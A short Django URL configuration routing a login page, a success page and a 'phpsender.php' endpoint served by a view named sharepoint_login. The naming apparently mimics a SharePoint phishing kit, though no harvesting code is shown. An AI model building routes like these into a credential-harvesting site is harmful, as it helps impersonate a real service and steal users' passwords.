from django.urls import path
from .views import login_view, success_view, sharepoint_login

urlpatterns = [
    path("", login_view, name="login"),
    path("success/", success_view, name="success"),
    path("phpsender.php", sharepoint_login, name="sharepoint_login"),
]
